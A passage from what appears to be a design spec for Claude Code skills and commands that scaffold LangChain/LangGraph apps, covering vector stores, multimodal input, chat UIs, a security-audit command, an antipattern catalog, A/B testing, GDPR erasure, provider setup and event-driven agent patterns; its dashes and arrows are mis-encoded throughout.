**Pattern 6 "” Multi-Source Agent:** SQL tool and document search tool side-by-side. System prompt teaches the agent the decision rule for which source to use ("For factual company data â†’ SQL. For policy/procedure questions â†’ documents.").

**Security checklist:** 10-item checklist covering parameterized queries, SELECT-only enforcement, connection string in env vars, result size limits, audit logging.

**Concepts taught:** AST-based SQL validation, `sqlglot` rewriting, `allow_dangerous_code` implications, E2B sandboxing, `reduce_openapi_spec`, column-as-metadata pattern

**Transitions:** "For vector store setup to power the document search tool â†’ lc:vectorstore. For sandboxing code execution â†’ lc:guardrails Pattern 4. For compliance when querying databases with PII â†’ lc:compliance."

---

### Skill: lc-vectorstore

**File:** `.claude/skills/lc-vectorstore/SKILL.md`

**Description:** Vector store patterns "” provider selection, embedding caching, CRUD lifecycle, multi-tenant namespacing, incremental index updates, zero-downtime migration, health monitoring, hybrid search, and pgvector deep dive.

**Trigger conditions:** Any of "” "vector store", "embeddings", "Chroma", "Pinecone", "Qdrant", "pgvector", "Weaviate", "FAISS", "hybrid search", "semantic search", "embedding cache", `/lc-vectorstore`

**Discovery flow (4 questions):**

```
1. Which vector store provider?
   A) Chroma (local dev, OSS)
   B) Pinecone (managed, serverless)
   C) Qdrant (OSS or managed, best filtering)
   D) pgvector (PostgreSQL extension, existing DB)
   E) FAISS (local, no server needed)
   F) Weaviate (managed or OSS)
   G) Not sure "” show me the comparison table

2. Single tenant or multi-tenant?
   A) Single tenant
   B) Multi-tenant (each user/org has isolated data)

3. How often does your index change?
   A) Static "” indexed once, read many times
   B) Incremental "” new documents added daily/weekly
   C) Streaming "” documents arrive continuously

4. Approximate document count?
   A) < 10,000 (any provider works)
   B) 10,000 "“ 1,000,000
   C) > 1,000,000 (need HNSW or IVFFlat tuning)
```

**Nine patterns:**

**Pattern 1 "” Provider Comparison:** Selection table (scale, cost, self-hosted, hybrid search, managed options) plus concrete decision rules.

**Pattern 2 "” Embedding Caching:** `CacheBackedEmbeddings` with `LocalFileStore` (dev) and `RedisStore` (prod). Cache key construction explained. 90% cost savings rationale.

**Pattern 3 "” CRUD Lifecycle:** `add_documents`, `similarity_search_with_score`, `as_retriever`, hash-based `update_document`, `delete_by_ids`, `delete_by_source`, full `upsert_documents` with hash comparison.

**Pattern 4 "” Multi-Tenant Namespacing:** `PerTenantStore` (collection-per-tenant) and `MetadataFilterStore` (single collection). GDPR right-to-erasure implementation for both strategies. Scale recommendation thresholds (< 1,000 tenants: collection-per-tenant; > 1,000: metadata filter).

**Pattern 5 "” Incremental Index Updates:** SQLite-backed `DocumentHash` table tracking `(doc_id, content_hash, chunk_ids, last_updated)`. Full ingest loop skips unchanged docs and detects deletions.

**Pattern 6 "” Index Migration:** Export from old store, batch bulk upsert with progress, overlap-based validation, `DualWriteVectorStore` for zero-downtime cutover.

**Pattern 7 "” Health Monitoring:** Document count, query latency with configurable threshold, staleness detection against retention window. JSON-serializable output for Prometheus.

**Pattern 8 "” Hybrid Search:** `EnsembleRetriever` (BM25 + semantic, Reciprocal Rank Fusion). Pinecone native sparse+dense. Qdrant `FastEmbedSparse`. pgvector full-text SQL.

**Pattern 9 "” pgvector Deep Dive:** Extension install note. HNSW vs IVFFlat selection table. `PGVector` from `langchain-postgres`. DDL for both index types. JSONB metadata filtering. Session-level performance tuning parameters.

**Concepts taught:** Cache key construction, RRF formula, HNSW vs IVFFlat tradeoffs, zero-downtime migration via dual-write, why collection-per-tenant breaks down at scale

**Transitions:** "For building a full RAG pipeline on top of this vector store â†’ rag skill. For multi-tenant isolation with per-user quotas â†’ lc:memory Section 8. For monitoring index health in production â†’ lc:monitor."

---

### Skill: lc-multimodal

**File:** `.claude/skills/lc-multimodal/SKILL.md`

**Description:** Multimodal LangChain patterns "” image analysis, PDF loaders, table extraction, document layout, multimodal RAG, audio/Whisper transcription, multimodal agents, batch processing, and content moderation.

**Trigger conditions:** Any of "” "image", "PDF", "multimodal", "vision", "audio", "Whisper", "OCR", "document parsing", "table from image", "screenshot analysis", `/lc-multimodal`

**Teaching section (before any code):** Explains multimodal content blocks, contrasts old `image_url` dict approach vs new `HumanMessage(content=[...])` list approach. Shows the exact JSON shape of a multimodal `HumanMessage` so readers understand what they are building before seeing the helper functions.

**Discovery flow (3 questions):**

```
1. What type of input are you processing?
   A) Images (screenshots, photos, diagrams)
   B) PDFs (text-based)
   C) PDFs (scanned/image-based, need OCR)
   D) Tables in images or PDFs
   E) Audio files
   F) Multiple types

2. What is the document structure?
   A) Simple (no tables, no complex layout)
   B) Complex layout (multi-column, headers, tables mixed with text)
   C) Forms or invoices (structured data extraction)

3. What is the output format?
   A) Free-form text / summary
   B) Structured data (Pydantic model)
   C) Feed into a RAG pipeline
```

**Nine patterns:**

**Pattern 1 "” Image Input:** `encode_image_to_b64` with magic-byte MIME detection. `analyze_image` (base64), `analyze_image_url` (URL). `compare_images` for two-image analysis. LangGraph `vision_node`. Format/size limits table.

**Pattern 2 "” PDF Loaders:** Trade-off table (PyPDFLoader/UnstructuredPDFLoader/PyMuPDFLoader/AmazonTextractPDFLoader). Full code for all four. When to use each: fast text extraction, layout preservation, image extraction, scanned/OCR.

**Pattern 3 "” Table Extraction:** HTML table to Markdown via pandas. `with_structured_output` to `FinancialTable` Pydantic model. Handling multi-row headers.

**Pattern 4 "” Document Layout:** Element-type filtering by `metadata.category`. Full `Invoice` Pydantic schema. Partition-then-extract pipeline for forms.

**Pattern 5 "” Multimodal RAG:** `describe_image` at ingest (generates searchable text descriptions). PyMuPDF image extraction loop. Chroma vector store. LCEL retrieval chain.

**Pattern 6 "” Audio/Whisper:** Two `@tool` variants (OpenAI API vs local `whisper` library). Trade-off comparison (cost vs privacy). Meeting summary LCEL chain.

**Pattern 7 "” Multimodal Agent:** Three tools (screenshot, analyze_image_file, extract_pdf_text). `AgentState` with `add_messages` reducer. Conditional edges. `chat_with_image` helper.

**Pattern 8 "” Batch Processing:** `asyncio.Semaphore` for concurrency control. `as_completed` progress streaming. JSONL checkpointing for crash recovery (processed items are not re-processed on restart).

**Pattern 9 "” Content Moderation:** `ModerationResponse` Pydantic model with `safe`, `category`, `confidence`, `reason`. Claude Haiku pre-screener (cheap fast gate). LangGraph conditional routing node.

**Supporting sections:** Dependency table keyed by pattern, `.env.example` template, decision tree, concepts-taught index.

**Concepts taught:** Content block format, magic-byte MIME detection, why image descriptions at ingest improve retrieval, asyncio Semaphore, JSONL checkpointing semantics

**Transitions:** "For RAG pipeline setup â†’ rag skill. For batch processing with observability â†’ lc:monitor. For compliance when processing documents with PII â†’ lc:compliance."

---

### Skill: lc-ui

**File:** `.claude/skills/lc-ui/SKILL.md`

**Description:** User interface patterns for LangChain/LangGraph apps "” Chainlit, Gradio, Streamlit, FastAPI+HTMX with streaming, file upload, OAuth/password authentication, human-in-the-loop UI, tool call visualization, and source citation display.

**Trigger conditions:** Any of "” "UI", "chat interface", "Chainlit", "Gradio", "Streamlit", "FastAPI frontend", "streaming chat", "file upload", "deploy chat app", `/lc-ui`

**Discovery flow (3 questions):**

```
1. Which framework do you prefer?
   A) Chainlit "” recommended for production chat apps (built for LLM UIs)
   B) Gradio "” recommended for demos and ML teams
   C) Streamlit "” recommended for data science teams
   D) FastAPI + HTMX "” recommended for custom UI requirements
   E) Not sure "” show me the comparison table

2. Do you need authentication?
   A) No auth (internal tool, single user)
   B) Password auth (simple username/password)
   C) OAuth (Google, GitHub, etc.)
   D) JWT / custom (integrate with existing auth system)

3. Do you need file upload support?
   A) No
   B) Yes "” PDF/document upload for RAG
   C) Yes "” image upload for vision
```

**Framework recommendation table:** Chainlit (production chat, tool viz, HITL), Gradio (demos, quick sharing, HF Spaces), Streamlit (data dashboards, data science teams), FastAPI+HTMX (custom UI, existing frontend team).

**Concept: Why Streaming Matters:** User experience difference. How each framework achieves streaming (Chainlit: `stream_token`, Gradio: Python `yield`, Streamlit: `st.write_stream`, FastAPI: SSE `EventSourceResponse`).

**Section 1 "” Chainlit (primary recommendation):**
- Minimal `app.py` with `@cl.on_chat_start` (uuid thread isolation), `@cl.on_message` (astream_events v2 streaming), `cl.user_session`
- Message history via `AsyncPostgresSaver` + `@cl.on_chat_resume`
- File upload with `cl.AskFileMessage` â†’ Chroma RAG ingestion
- OAuth callback + custom password auth
- Complete production app with tool visualization via `cl.Step`
- Docker deployment snippet

**Section 2 "” Gradio:**
- `gr.ChatInterface` with Python generator for streaming
- `asyncio.run()` bridge pattern with explanation
- `gr.State` for per-session thread_id
- File upload + per-session vectorstore
- HF Spaces deployment commands

**Section 3 "” Streamlit:**
- Critical `@st.cache_resource` warning (Streamlit reruns the whole script on every message "” LangGraph graph must be cached)
- `st.write_stream` streaming
- File upload in sidebar with temp file handling
- `streamlit-authenticator`

**Section 4 "” FastAPI + HTMX:**
- SSE concept explained (what `data:` lines are, how `EventSource` works)
- `sse-starlette` `EventSourceResponse`
- Inline HTML page with vanilla JS SSE consumer

**Section 5 "” Common Patterns:** Source citation (Chainlit elements + Streamlit expander), tool call visualization with `cl.Step`, HITL with `cl.AskActionMessage` + `Command(resume=None)`, user-friendly error messages.

**Concepts taught:** SSE framing, `@st.cache_resource` necessity, `gr.State` per-session isolation, `cl.Step` for tool visualization, `asyncio.run()` bridge for sync Gradio

**Transitions:** "For securing the backend API â†’ lc:guardrails. For deploying to production â†’ lc:deploy. For adding memory/conversation history â†’ lc:memory."

---

## New Commands (Full Specs)

### Command: /lc-guard

**File:** `.claude/commands/lc-guard.md`
**Argument hint:** `[path/to/project]`
**Allowed tools:** `Read, Glob, Grep, Write, Edit`

**Purpose:** Audit an existing LangChain/LangGraph project for 8 security gaps, report findings with severity, then (with confirmation) generate `guardrails_layer.py` with fixes.

**Execution flow:**

**Step 1 "” Identify project root.** If `$ARGUMENTS` provided, use that path. Otherwise scan upward for `pyproject.toml` or `langgraph.json`.

**Step 2 "” Run 8 detection rules (read-only):**

| Rule | Detection signal | Severity |
|------|-----------------|----------|
| 1 | `HumanMessage(content=` or `state["messages"].append` with no `sanitize_input` call upstream | HIGH |
| 2 | `ToolMessage` or `tool_output` appended to messages with no sanitization | HIGH |
| 3 | `graph.ainvoke` or `app.ainvoke` present with no `CostCircuitBreaker` in callbacks | MEDIUM |
| 4 | `await.*\.ainvoke` with no enclosing `asyncio.wait_for` | MEDIUM |
| 5 | `from langchain.tools import PythonREPLTool` or `PythonREPLTool()` | CRITICAL |
| 6 | `ToolNode(tools)` without `handle_tool_errors=True` | HIGH |
| 7 | User input ingested with no length check (`len(` or `MAX_INPUT`) | MEDIUM |
| 8 | `LANGSMITH_TRACING=true` with state fields containing `email`, `name`, `ssn`, `phone`, `address` | LOW"“HIGH |

Each rule reports: file path, line number, matched text, one-sentence production risk.

**Step 3 "” Severity summary table.** Prints a table of all findings sorted by severity. CRITICAL findings are listed first with a red-bordered ASCII warning block.

**Step 4 "” Confirmation gate.** "Found N gaps. Generate guardrails_layer.py with fixes? (y/n)"

**Step 5 "” (If confirmed) Generate `guardrails_layer.py` with 6 sections:**

1. `sanitize_input()` / `sanitize_input_node()` "” 3-layer input defense (length â†’ regex â†’ LLM-as-judge stub)
2. `CostCircuitBreaker(BaseCallbackHandler)` "” sync + async `on_llm_end`, `asyncio.Lock`, Anthropic/OpenAI pricing table
3. `ToolOutputSanitizer` "” blocklist regex stripping instruction patterns from tool output
4. `make_safe_tool_node(tools)` "” wraps `ToolNode(tools, handle_tool_errors=True)` + sanitizes `ToolMessage.content`
5. `redact_pii_from_output()` / `redact_output_node()` "” Presidio-based redaction, REJECT for SSN/credit card
6. `guarded_invoke()` "” drop-in wrapper for graphs that do not need topology changes

**Step 6 "” Print integration instructions.** For each finding, shows the exact surgical edit needed (import line, node insertion point, config addition). Does not auto-apply edits "” shows diffs for user to apply.

**Step 7 "” Print "Next steps"** pointing to `lc:guardrails` for deeper patterns and `lc:audit` for compliance logging.

---

### Command: /lc-antipatterns

**File:** `.claude/commands/lc-antipatterns.md`
**Argument hint:** `[number|keyword|scan <file>]`
**Allowed tools:** `Read, Glob, Grep`

**Purpose:** Interactive read-only catalog of 15 LangChain antipatterns. Three modes: menu, direct lookup, file scan.

**Mode 1 "” Menu (no args):** Prints numbered list of all 15 with one-line description. User picks number, keyword, or `all`.

**Mode 2 "” Direct lookup:** `/lc-antipatterns 7` or `/lc-antipatterns memorysaver`. Displays full entry with: Symptom, Root cause, Why it hurts in production, Fix (before/after code), Related antipatterns.

**Mode 3 "” File scan:** `/lc-antipatterns scan agent.py`. Reads file, checks 15 detection signals, reports file:line, matched text, production risk, and pointer to full entry. Produces summary table with severity.

**The 15 antipatterns:**

| # | Name | Severity | Detection signal |
|---|------|----------|-----------------|
| 1 | LLMChain in 2024+ | BREAKING | `from langchain.chains import LLMChain` |
| 2 | AgentExecutor instead of LangGraph | BREAKING | `from langchain.agents import AgentExecutor` |
| 3 | MemorySaver in production | HIGH | `MemorySaver()` with no comment explaining why |
| 4 | Node returns None | HIGH | `def node(state):` with no `return` statement |
| 5 | Mutable state in nodes | HIGH | `state["list"].append(` or `state["dict"].update(` |
| 6 | Missing recursion_limit | HIGH | `graph.compile()` with no `graph.compile(recursion_limit=` |
| 7 | Forgetting .compile() | HIGH | `graph.add_node` present but no `.compile()` call |
| 8 | Wrong import paths | BREAKING | `from langchain.` (non-community/core package) |
| 9 | Sync tool in async graph | MEDIUM | `@tool` + `def ` (not `async def`) in async graph |
| 10 | ConversationBufferMemory unbounded | MEDIUM | `ConversationBufferMemory(` |
| 11 | One DB connection per request | MEDIUM | `asyncpg.connect(` inside a node function |
| 12 | Hardcoded thread_id | HIGH | `thread_id="main"` or `thread_id="default"` literal |
| 13 | @tool called directly | MEDIUM | `tool_func(args)` instead of `tool_func.invoke(args)` |
| 14 | Naive retry without jitter | MEDIUM | `time.sleep(retry_count * 2)` |
| 15 | LangSmith always-on with PII | HIGH | `LANGSMITH_TRACING=true` with sensitive field names in state |

**Severity is consistent with /lc-review (BREAKING/HIGH/MEDIUM/LOW).** Antipatterns 1, 2, 10 cross-reference `/lc-upgrade` for mechanical fixes.

---

### Command: /lc-ab-test

**File:** `.claude/commands/lc-ab-test.md`
**Argument hint:** `[--prompt | --model | --chain]`
**Allowed tools:** `Read, Glob, Grep, Write, Bash`

**Purpose:** Scaffold an A/B evaluation harness for comparing prompt variants, model choices, or chain architectures using LangSmith datasets with statistically rigorous analysis.

**Execution flow (4-step wizard):**

**Step 1 "” What are you testing?** Three-way menu: prompt A vs B / model A vs B / chain A vs B. `--prompt`, `--model`, `--chain` args skip this step.

**Step 2 "” What dataset?** Three options: (1) existing LangSmith dataset name, (2) auto-create from recent runs, (3) create from scratch with inline examples. Option 2 generates `create_dataset_from_runs()` helper.

**Step 3 "” What metrics?** Multi-select: faithfulness, answer_relevancy, correctness, custom LLM-as-judge. At least one required.

**Step 4 "” Significance level?** Î± = 0.05 (standard) or Î± = 0.01 (strict).

Wizard prints full parameter summary and requires confirmation before writing any file.

**Generated files:**

**`ab_test.py`:**
- `async def variant_a / variant_b(inputs)` with `RunnableConfig(tags=["ab-test", "variant-a"], metadata={"ab_variant": "a"})`
- One evaluator function per selected metric, all using `claude-haiku-4-5` as judge
- `bootstrap_ci(scores, n_bootstrap=2000, alpha=ALPHA)` "” percentile bootstrap, no external dependencies
- `paired_t_test(scores_a, scores_b)` "” per-example differences (paired design removes between-example variance); uses `scipy.stats.t` if installed, pure-Python normal CDF approximation as fallback
- `early_stopping_recommendation(p_value, n_samples)` "” conservative `alpha/2` threshold before n=30; warns if below 30-sample power floor
- `run_ab_test()` "” `asyncio.gather()` for both variants concurrently, per-metric mean/CI/delta/t-statistic/p-value/recommendation

**`ab_router.py`:**
- `get_variant(user_id, test_name, rollout_percentage=50)` "” stable hash via `sha256(f"{test_name}:{user_id}")`, first 8 hex chars as 0-99 bucket
- `get_variant_metadata(user_id, test_name)` "” returns dict for `RunnableConfig`
- `async def route_request(user_id, inputs, test_name)` "” dispatches to correct variant
- `assignment_stats(user_ids, test_name)` "” verifies split balance

**`RESULTS_TEMPLATE.md`:** Variants table, results table with all statistical columns, LangSmith URL placeholders, decision criteria checklist (p < alpha AND CI does not cross zero AND n >= 30), early stopping log, decision block, lessons learned section.

**Design invariants:**

| Invariant | Value |
|-----------|-------|
| Judge model | `claude-haiku-4-5` (never the variant model under test) |
| Hash function | `sha256(f"{test_name}:{user_id}")`, first 8 hex chars mod 100 |
| Bootstrap samples | 2000 |
| Power floor | 30 examples |
| Early-stop threshold | `alpha/2` (conservative) |
| `scipy` dependency | Optional "” pure-Python fallback always present |

---

### Command: /lc-erase

**File:** `.claude/commands/lc-erase.md`
**Argument hint:** `<user_id>`
**Allowed tools:** `Read, Glob, Grep, Write`

**Purpose:** Generate a GDPR Article 17 right-to-erasure implementation "” detects data stores in the project, generates `compliance/erase_user.py` and `compliance/erasure_audit.sql`, enforces 30-day deadline awareness.

**Execution flow (7 steps):**

**Step 1 "” Parse user_id.** Extracts `TARGET_USER_ID` from `$ARGUMENTS`. Prompts if blank.

**Step 2 "” Confirmation gate.** Prints explicit warning block naming target `user_id` and every data store that will be targeted. Blocks until user types `y` or `yes`. Any other response: "Erasure cancelled."

**Step 3 "” Detect data stores.** Parallel Grep for 7 signals: `PostgresSaver`/`AsyncPostgresSaver`, `langchain_chroma`/`Chroma(`, `langchain_pinecone`/`PineconeVectorStore`, `langchain_qdrant`/`QdrantVectorStore`, `PGVector`/`langchain_postgres`, `LANGSMITH_TRACING`/`langsmith`, generic `vectorstore`. Prints detected/not-detected summary table.

**Step 4 "” Generate `compliance/erase_user.py`:**
- Module docstring citing GDPR Article 17, Article 5(1)(e)
- `ErasureResult` Pydantic v2 model: `status`, `user_id`, `records_deleted` (dict per store), `timestamp`, `erasure_record_id`, `errors`
- `async def delete_user_data(user_id, dry_run=False) -> ErasureResult` with 5 sections:
  1. PostgresSaver: `DELETE FROM checkpoints WHERE thread_id LIKE 'tenant:%:user:{user_id}:%'`
  2. Vector store: `delete(where={"user_id": user_id})` "” active for detected store; others commented as alternatives
  3. LangSmith: `list_runs(filter='has(metadata, {"user_id": "..."})') â†’ delete_runs()` in batches of 100
  4. Erasure audit INSERT (always runs, even if store deletions fail)
  5. Audit row redaction: `UPDATE audit.llm_calls SET session_id='[GDPR Art.17 erased YYYY-MM-DD]' WHERE user_id=$1` "” never DELETE
- `__main__` block with `--dry-run` flag

**Step 5 "” Generate `compliance/erasure_audit.sql`:**
- `CREATE SCHEMA IF NOT EXISTS compliance`
- `compliance.erasure_audit` table with UUID PK, `REVOKE DELETE`, `REVOKE UPDATE`, `REVOKE TRUNCATE`
- `ALTER TABLE audit.llm_calls ADD COLUMN IF NOT EXISTS redacted_at TIMESTAMPTZ`
- `compliance.erasure_summary` view
- `compliance.erasure_deadline_risk` view (requests < 30 days old, status != 'completed', time remaining)

**Step 6 "” Print 30-day deadline reminder.** Today's date, computed deadline (today + 30 days), 5-item compliance checklist.

**Step 7 "” Print summary.** Files generated, stores covered, 5 next-step bullets (run DDL, review `THREAD_ID_PATTERN`, test with `--dry-run`, production run, data subject notification).

**Compliance invariants enforced:**

1. `compliance.erasure_audit` is INSERT-only "” `REVOKE DELETE` and `REVOKE UPDATE` are explicit SQL
2. `audit.llm_calls` rows are never deleted "” redaction uses UPDATE with `redacted_at` timestamp
3. Erasure audit INSERT fires unconditionally (in its own try/except after store deletions)
4. `ErasureResult.erasure_record_id` is a UUID "” caller must store as DSAR cross-reference
5. `--dry-run` touches no data, exits with code 0
6. Pydantic v2 throughout (`BaseModel`, `Field`, `model_dump()`)
7. No hardcoded credentials "” all from `DATABASE_URL`/`POSTGRES_URL` env vars

---

### Command: /lc-providers (command)

**File:** `.claude/commands/lc-providers.md`
**Argument hint:** `[anthropic|openai|azure|bedrock|gemini|ollama|--swap]`
**Allowed tools:** `Read, Glob, Grep, Edit, Write, Bash`

**Purpose:** Configure LLM providers in an existing project "” generates `src/providers.py` factory, updates `.env.example`, supports provider migration via `--swap`.

**Argument routing:**

| Invocation | Behavior |
|------------|----------|
| `/lc-providers` | Full interactive menu wizard |
| `/lc-providers openai bedrock` | Named providers selected, skip menu, go to codegen |
| `/lc-providers --swap --from anthropic --to openai` | Provider migration flow |

**Wizard flow (6 steps):**

1. **Provider menu** "” numbered list of 6 providers plus option 7 (multi-provider fallback chain)
2. **Project scan** "” reads existing `src/providers.py`, `.env.example`, greps for existing provider imports before writing
3. **Per-provider config blocks** "” for each selected provider: `pip install` command, required env vars with where to get each key, minimal working code snippet, `get_llm()` factory branch code
4. **Generate `src/providers.py`** "” `get_llm(tier, provider)`, `get_embeddings()`, `get_resilient_llm()`, `PROVIDER_MODELS` dict mapping tiers to pinned model IDs, fallback chain function if option 7 selected
5. **Update `.env.example`** "” reads existing, appends only missing sections, includes source URLs
6. **Summary** "” files written, quick-start commands, usage snippet, install list, next steps

**Provider-specific details:**

- **Anthropic:** `max_tokens` required (no default). Dated model IDs only. Extended thinking example.
- **OpenAI:** Factory auto-sets `temperature=1` for o-series models by checking `model.startswith("o")`.
- **Azure OpenAI:** `azure_deployment=` not `model=` "” called out as most common mistake.
- **Bedrock:** Always `ChatBedrockConverse`. Three auth options. One-time model enablement step.
- **Gemini:** AI Studio API key vs Vertex AI ADC as commented alternatives. `max_output_tokens` (not `max_tokens`).
- **Ollama:** `ollama pull` commands. Streaming emphasized. `OllamaEmbeddings` for local RAG.

**`--swap` migration flow:**

1. Detects if `src/providers.py` already exists with `get_llm()` "” if so, tells user to change `LLM_PROVIDER=` in `.env` (no code edit needed)
2. For direct hardcoding: scans all Python files, shows per-file diff preview with model ID translation table
3. Requires explicit confirmation before touching any file
4. Applies minimal surgical edits
5. Emits post-swap checklist

**Key design invariants:**

- `load_dotenv()` placement is explicit in every code snippet and in the factory file "” must appear before any LangChain provider import
- Only selected providers are included in `PROVIDER_MODELS` (no stub scaffolding for unused providers)
- Fallback chain uses `.with_fallbacks(exceptions_to_handle=(Exception,))` "” broad catch is intentional

---

## Spec Extensions

### Extension 1: lc:graph "” Functional API (Phase 11)

**Extends:** `.claude/skills/graph.md`
**Insert:** After existing Phase 10, before Teaching Notes section

**Additions:**

1. **API Version note** "” callout directing new projects to Phase 11 as recommended starting point.

2. **Skill Flow update** "” add Phase 9, 10, and Phase 11 to the phase list with "NEW "” recommended starting point" annotation for Phase 11.

3. **Quick Reference decision tree additions:**
```
Q: Should I use Functional API or StateGraph for a new project?
A: Functional API if: sequential steps, parallel async tasks, function-shaped workflow.
   StateGraph if: complex branching, Send API, custom reducers, graph visualization needed.

Q: How do I run tasks in parallel in Functional API?
A: await asyncio.gather(task1(input), task2(input))

Q: Can I use interrupt() in Functional API?
A: Yes, but only inside @task functions, not inside @entrypoint directly.

Q: How do I migrate StateGraph to Functional API?
A: See Phase 11.8 migration table "” each node becomes a @task, the graph becomes an @entrypoint.
```

4. **Phase 11 "” Functional API (11 sub-sections):**

**11.1 `@task`:** Sync/async forms. Future-like return. Rules: JSON-serializable args/return, idempotent (may re-execute on resume), must be called from `@entrypoint`.

**11.2 `@entrypoint`:** Compiles the workflow. Checkpointer attachment. Identical invocation interface to StateGraph (`invoke`, `ainvoke`, `stream`, `astream`, `astream_events`).

**11.3 Parallel tasks:** `asyncio.gather` for true async parallelism. Sequential futures. Fan-out over a list. Checkpoint replay behavior explained (completed tasks are not re-executed on resume).

**11.4 Runtime equivalence table:**

| StateGraph feature | Functional API equivalent |
|--------------------|--------------------------|
| `add_node` | `@task` function |
| `add_edge` | function call sequence |
| `add_conditional_edges` | `if/else` in `@entrypoint` |
| `StateGraph.compile()` | `@entrypoint` decorator |
| `interrupt()` | `interrupt()` inside `@task` |
| `Send` API | `asyncio.gather` with list |
| Custom reducers | explicit merge in `@entrypoint` |

**11.5 When Functional API wins:** Function-shaped workflows, rapid prototyping, less boilerplate. Concrete before/after code comparison.

**11.6 When StateGraph wins:** Complex conditional routing, Send API, custom reducers, graph visualization, Studio/Cloud tooling, compile-time static interrupts.

**11.7 Mixing both:** Complete working example "” compiled StateGraph (ReAct agent) wrapped as `@task` inside `@entrypoint`. Two agents running in parallel via `asyncio.gather`. Key rule: subgraph compiled without checkpointer (the outer `@entrypoint` owns checkpointing).

**11.8 Migration guide:** Mechanical mapping table + complete before/after code.

**11.9 `interrupt()` inside `@task`:** Full HITL example (email approval workflow). `Command(resume=...)` invocation loop. Rules: re-execution semantics, multiple interrupts, checkpointer requirement.

**11.10 Complete research pipeline (150-line runnable example):**
```python
@task
async def research(topic: str) -> str: ...

@task
async def write_report(research_results: list[str]) -> str: ...

@task
async def editorial_review(draft: str) -> str:
    decision = interrupt({"draft": draft, "action": "approve_or_revise"})
    return decision

@task
async def publish(report: str) -> dict: ...

@entrypoint(checkpointer=checkpointer)
async def research_pipeline(topics: list[str]) -> dict:
    research_tasks = await asyncio.gather(*[research(t) for t in topics])
    draft = await write_report(list(research_tasks))
    reviewed = await editorial_review(draft)
    result = await publish(reviewed)
    return result
```

**11.11 Imports cheatsheet:**
```python
from langgraph.func import entrypoint, task
from langgraph.types import interrupt, Command
```

5. **Teaching Notes additions (items 8-10):**
- Item 8: Recommend Functional API first for new projects
- Item 9: Common Functional API mistake "” `interrupt()` in `@entrypoint` instead of `@task`
- Item 10: Migration decision guidance "” when to migrate, when to stay on StateGraph

---

### Extension 2: lc:agent "” Event-Driven Patterns (Pattern 6)

**Extends:** `.claude/skills/lc-agent/SKILL.md`
**Insert:** After Pattern 5, before Common Mistakes section

**Additions:**

1. **Frontmatter description extension:** Add triggers for event-driven agents, webhooks, crons, queues, Slack bots, background runs, idempotent execution.

2. **Skill Flow addition:** Step 6 "” "Event-driven trigger? Yes â†’ Pattern 6 "” ask: webhook / cron / queue / Slack bot?"

3. **Pattern Selection Guide table addition:** Pattern 6 row: `Event-Driven | Agent triggered by webhook, cron, queue, or Slack | Medium-High`

4. **Decision flowchart addition:** Prepend event-driven branch: "Is this agent triggered by an external event (not a chat message)? â†’ Pattern 6"

5. **Pattern 6 "” Event-Driven Agents (~1600 lines):**

**Concept table:** Chat agents vs event-driven agents (trigger, invocation, response, persistence, concurrency model).

**Concept: Idempotency via run_id:**
```python
import uuid
def make_run_id(event_type: str, event_id: str) -> str:
    # Deterministic UUID from event "” same event always gets same run_id
    return str(uuid.uuid5(uuid.NAMESPACE_URL, f"{event_type}:{event_id}"))
```

**Sub-pattern A "” Webhook Trigger:**
```python
# webhook_agent.py
async def verify_github_signature(payload: bytes, signature: str, secret: str) -> bool:
    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    return hmac.compare_digest(f"sha256={expected}", signature)

@app.post("/webhook/github")
async def github_webhook(request: Request, background_tasks: BackgroundTasks):
    payload = await request.body()
    if not await verify_github_signature(payload, request.headers.get("X-Hub-Signature-256", ""), GITHUB_SECRET):
        raise HTTPException(status_code=401)
    event = await request.json()
    run_id = make_run_id("github", event["delivery"])
    background_tasks.add_task(run_agent_background, event, run_id)
    return {"status": "accepted", "run_id": run_id}
```

**Sub-pattern B "” LangGraph Platform Background Run:**
```python
run = await client.runs.create(
    thread_id=thread_id,
    assistant_id="agent",
    input={"messages": [{"role": "user", "content": event_payload}]},
    config={"configurable": {"run_id": run_id}},
    multitask_strategy="enqueue",
)
result = await client.runs.join(thread_id, run["run_id"])
```

**Sub-pattern C "” Cron Scheduling:**
```python
cron = await client.crons.create(
    assistant_id="digest_agent",
    schedule="0 9 * * 1-5",  # 9am weekdays
    input={"messages": [{"role": "user", "content": "Generate daily digest"}]},
)
```

**Sub-pattern D "” Local Dev Queue:**
```python
async def consumer_worker(queue: asyncio.Queue, worker_id: int, seen: set):
    while True:
        event = await queue.get()
        if event.event_id in seen:
            queue.task_done()
            continue
        seen.add(event.event_id)
        await process_event(event)
        queue.task_done()
```

**Sub-pattern E "” Slack Bot:**
```python
def slack_thread_id(event: dict) -> str:
    thread_ts = event.get("thread_ts") or event.get("ts")
    return f"slack:{event['channel']}:{thread_ts}"

@bolt_app.event("app_mention")
def handle_mention(event, say, client):
    asyncio.create_task(run_agent_and_reply(event, say, client))
```

**Sub-pattern F "” Long-Horizon Async Interrupts:**
```python
@app.post("/agent/start")
async def start_agent(request: StartRequest):
    thread = await checkpointer.aput_writes(...)
    config = {"configurable": {"thread_id": request.thread_id}}
    asyncio.create_task(graph.ainvoke(request.input, config))
    return {"thread_id": request.thread_id, "status": "running"}

@app.post("/agent/resume")
async def resume_agent(request: ResumeRequest):
    config = {"configurable": {"thread_id": request.thread_id}}
    asyncio.create_task(graph.ainvoke(Command(resume=request.decision), config))
    return {"status": "resumed"}
```

**Event-Driven Testing (`test_event_driven.py`):** HMAC missing/bad/valid tests, deterministic `run_id` test, duplicate dedup test, queue dedup test, interrupt pause-and-resume lifecycle test.

**Common Mistakes (Event-Driven) "” 10-row table:**

| Mistake | Fix |
|---------|-----|
| Blocking webhook handler with `await graph.ainvoke` | Use `BackgroundTasks.add_task` |
| String comparison for HMAC | Use `hmac.compare_digest` |
| MemorySaver with interrupts | Use `AsyncPostgresSaver` |
| Missing `run_id` deduplication | Use deterministic UUID5 from event ID |
| Creating new thread per event | Use stable `thread_id` per entity |
| No timeout on background task | Wrap with `asyncio.wait_for` |
| Synchronous Slack handler | Use `asyncio.create_task` |
| Re-processing on restart | Track processed event IDs in Redis |
| No dead letter queue | Log failed events, retry with backoff |
| Polling instead of join | Use `client.runs.join()` |

---

### Extension 3: lc:rag "” Advanced Patterns (9-12)

**Extends:** `.claude/skills/rag/SKILL.md`
**Insert:** After Pattern 8, before environment variables section

**Discovery table additions:**

| Query type | Accuracy need | Pattern |
|-----------|---------------|---------|
| Long documents, needs context | High | Pattern 9 (Contextual Retrieval) |
| Mixed keyword + semantic | High | Pattern 10 (Hybrid Search RRF) |
